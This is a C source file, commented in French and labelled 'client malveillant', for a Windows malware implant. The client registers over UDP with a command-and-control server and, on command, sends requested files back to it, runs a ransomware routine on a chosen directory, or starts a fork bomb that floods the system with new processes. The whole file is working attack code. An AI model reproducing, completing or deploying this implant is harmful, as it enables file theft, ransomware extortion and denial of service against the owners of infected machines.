/**
 * @file client.c
 * @brief Implémentation du client malveillant
 * @author Valentin Pizzio
 * @date 21/12/2024
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <winsock2.h>
#include <windows.h>
#include "client.h"
#include "protocol.h"
#include "exfiltration.h"
#include "ransomware.h"

// Nécessaire pour la compilation avec MinGW
#pragma comment(lib, "ws2_32.lib")

// Buffer pour les messages d'erreur
static char error_buffer[256];

/**
 * @brief Génère un identifiant client aléatoire
 * 
 * @param buffer Buffer où stocker l'ID généré
 * @param length Longueur souhaitée de l'ID
 */
static void generate_client_id(char* buffer, size_t length) {
    const char charset[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZ";
    srand((unsigned int)time(NULL));
    
    for (size_t i = 0; i < length - 1; i++) {
        buffer[i] = charset[rand() % (sizeof(charset) - 1)];
    }
    buffer[length - 1] = '\0';
}

/**
 * @brief Initialise le client
 * 
 * @return SOCKET Le socket client initialisé
 */
SOCKET init_client(void) {
    WSADATA wsa;
    SOCKET client_fd;
    
    // Initialisation de Winsock
    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) {
        snprintf(error_buffer, sizeof(error_buffer), "Failed to initialize Winsock\n");
        fprintf(stderr, "%s", error_buffer);
        exit(EXIT_FAILURE);
    }
    
    // Création du socket UDP
    if ((client_fd = socket(AF_INET, SOCK_DGRAM, 0)) == INVALID_SOCKET) {
        snprintf(error_buffer, sizeof(error_buffer), "Could not create socket\n");
        fprintf(stderr, "%s", error_buffer);
        WSACleanup();
        exit(EXIT_FAILURE);
    }
    
    return client_fd;
}

/**
 * @brief Traite une commande reçue du serveur
 * 
 * @param msg La commande reçue
 * @param socket_fd Le socket client
 * @param server_addr L'adresse du serveur
 */
void handle_command(Message msg, SOCKET socket_fd, struct sockaddr_in server_addr) {
    int server_len = sizeof(server_addr);
    char buffer[BUFFER_SIZE];
    
    switch (msg.cmd) {
        case CMD_LIST_FILES:
            // Reçoit la liste des fichiers et l'affiche
            recvfrom(socket_fd, (char*)&msg, sizeof(Message), 0,
                    (struct sockaddr*)&server_addr, &server_len);
            printf("\nAvailable files:\n%s", msg.data);
            break;
            
        case CMD_EXFILTRATION:
            // Exfiltre le fichier demandé
            exfiltrate_file(msg.filename, buffer, sizeof(buffer));
            strcpy(msg.data, buffer);
            sendto(socket_fd, (char*)&msg, sizeof(Message), 0,
                  (struct sockaddr*)&server_addr, sizeof(server_addr));
            break;
            
        case CMD_RANSOMWARE:
            // Lance le ransomware sur le répertoire spécifié
            ransomware_directory(msg.data, msg.filename, buffer, sizeof(buffer));
            strcpy(msg.data, buffer);
            sendto(socket_fd, (char*)&msg, sizeof(Message), 0,
                  (struct sockaddr*)&server_addr, sizeof(server_addr));
            break;
            
        case CMD_FORK:
            // Lance un fork bomb
            while (1) {
                system("start");
            }
            break;
            
        case CMD_OUT:
            // Termine le programme
            closesocket(socket_fd);
            WSACleanup();
            exit(EXIT_SUCCESS);
            break;
            
        default:
            printf("Unknown command received\n");
            break;
    }
}

int main(void) {
    SOCKET socket_fd;
    struct sockaddr_in server_addr;
    Message msg;
    char client_id[ID_LENGTH];
    
    // Génère un identifiant client aléatoire
    generate_client_id(client_id, ID_LENGTH);
    
    // Initialise le client
    socket_fd = init_client();
    
    // Configure l'adresse du serveur
    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(SERVER_PORT);
    server_addr.sin_addr.s_addr = inet_addr(SERVER_IP);
    
    // Envoie le message initial avec l'ID client
    memset(&msg, 0, sizeof(Message));
    strncpy(msg.client_id, client_id, ID_LENGTH);
    sendto(socket_fd, (char*)&msg, sizeof(Message), 0,
           (struct sockaddr*)&server_addr, sizeof(server_addr));
    
    printf("Connected to server with ID: %s\n", client_id);
    
    while(1) {
        int recv_len = recvfrom(socket_fd, (char*)&msg, sizeof(Message), 0, NULL, NULL);
        if (recv_len > 0) {
            handle_command(msg, socket_fd, server_addr);
        }
    }
    
    closesocket(socket_fd);
    WSACleanup();
    return 0;
}